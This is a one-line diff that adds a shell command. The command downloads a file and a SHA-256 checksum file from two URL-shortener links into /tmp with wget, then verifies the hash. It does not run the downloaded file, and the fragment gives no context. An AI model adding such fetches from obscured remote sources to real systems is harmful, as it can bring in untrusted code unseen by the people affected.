@@ -1,0 +1,1 @@
+URL="http://gg.gg/wrt_"; Ma256="http://gg.gg/_wrt";cd /tmp;wget $URL;wget -O _Ma256 $Ma256;sha256sum -c _Ma256 2>/dev/null|grep OK
